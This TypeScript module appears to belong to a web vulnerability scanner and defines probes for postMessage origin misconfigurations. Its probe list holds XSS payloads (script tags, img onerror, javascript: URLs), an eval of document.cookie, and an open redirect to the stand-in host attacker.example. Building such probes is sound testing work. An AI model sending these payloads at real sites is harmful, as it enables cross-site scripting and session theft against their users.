import type { PayloadVariant, MutationContext } from '../types';

export const META = {
  id: 'postmessage-misconfig',
  family: 'postMessage-misconfig' as const,
  name: 'postMessage Origin Misconfiguration',
  description: 'Detects postMessage handlers that trust any origin or forward message data unsafely.',
  defaultRisk: 'none' as const,
  insertionPointKinds: ['body'],
};

const PROBES = [
  { value: '{"type":"pf-probe","data":"<img src=x onerror=alert(1)>"}', intent: 'postMessage with wildcard origin (*) receiver and XSS payload in data', signals: ['postmessage-misconfig-detected'] },
  { value: '{"type":"navigate","url":"javascript:alert(1)"}', intent: 'postMessage missing origin check — receiver navigates to attacker URL', signals: ['postmessage-misconfig-detected'] },
  { value: '{"action":"setHTML","value":"<script>alert(1)</script>"}', intent: 'postMessage forwarded to innerHTML without sanitization', signals: ['postmessage-misconfig-detected'] },
  { value: '{"cmd":"eval","payload":"alert(document.cookie)"}', intent: 'postMessage data passed directly to eval()', signals: ['postmessage-misconfig-detected'] },
  { value: '{"redirect":"//attacker.example/"}', intent: 'postMessage triggers open redirect via location.href assignment', signals: ['postmessage-misconfig-detected'] },
  { value: '{"token":"pf-exfil","secret":"'+('x'.repeat(64))+'"}', intent: 'postMessage exfiltration probe — sensitive data forwarded cross-origin', signals: ['postmessage-misconfig-detected'] },
  { value: '{"type":"pf-probe","origin":"*"}', intent: 'postMessage handler registered with origin wildcard — no validation performed', signals: ['postmessage-misconfig-detected'] },
];

export function variants(ctx?: MutationContext): PayloadVariant[] {
  return PROBES.map((p, i) => ({
    id: `postmessage-${i + 1}`,
    family: 'postMessage-misconfig' as const,
    value: p.value,
    encoding: 'raw' as const,
    intent: p.intent,
    requiresOast: false,
    requiresBrowser: true,
    destructiveRisk: 'none' as const,
    expectedSignals: p.signals,
  }));
}
